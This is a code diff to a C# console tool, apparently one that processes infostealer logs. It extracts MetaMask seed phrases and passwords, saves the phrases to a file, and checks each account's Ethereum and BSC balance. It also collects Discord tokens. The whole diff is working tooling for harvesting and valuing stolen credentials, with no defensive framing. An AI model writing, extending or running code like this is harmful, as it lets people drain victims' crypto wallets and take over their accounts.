@@ -4,41 +4,54 @@ using Console.Models.Attributes;
 using Console.Models.Views;
 using Core.Discord;
 using Core.Wallets;
+using Microsoft.Extensions.Configuration;
 
 namespace Console.Views;
 
 public class MainView : ArgsView
 {
-    private readonly Configuration _config;
+    private readonly Settings _settings;
+    private readonly IConfiguration _config;
     
-    public MainView(IRoot root, Configuration config) : base(root)
+    public MainView(IRoot root, Settings settings, IConfiguration config) : base(root)
     {
+        _settings = settings;
         _config = config;
     }
     
     [Command]
-    public Task Wallets()
+    public async Task Wallets()
     {
         Directory.CreateDirectory("Wallets");
-        
+
         using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
         {
             Access = FileAccess.Write,
             Mode = FileMode.OpenOrCreate,
         });
+        var checker = new MetamaskChecker(_config["Web3:Eth"]!, _config["Web3:Bsc"]!);
         
-        foreach (var wallet in new MetamaskParser().ByLogs(_config.Path).DistinctBy(x => x?.Mnemonic))
+        foreach (var wallet in new MetamaskParser().ByLogs(_settings.Path).DistinctBy(x => x?.Mnemonic))
         {
-            if (wallet?.Mnemonic is null) continue;
+            if (wallet is not {Mnemonic:not null, Password:not null}) continue;
             
             System.Console.WriteLine(wallet.Mnemonic);
-            mnemonics.WriteLine(wallet.Mnemonic);
+            await mnemonics.WriteLineAsync(wallet.Mnemonic);
+            
+            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
+            {
+                System.Console.WriteLine(account.Name);
+                System.Console.WriteLine(account.Address);
+                
+                foreach (var balance in await checker.Balance(account.Address))
+                {
+                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
+                }
+            }
         }
         
         System.Console.WriteLine("Press any key for continue");
         System.Console.ReadKey(true);
-
-        return Task.CompletedTask;
     }
 
     [Command]
@@ -67,7 +80,7 @@ public class MainView : ArgsView
             valid = new StreamWriter("Discord/valid.txt", options);
         }
 
-        foreach (var token in new DiscordParser().ByLogs(_config.Path).Distinct())
+        foreach (var token in new DiscordParser().ByLogs(_settings.Path).Distinct())
         {
             all.WriteLine(token);
 
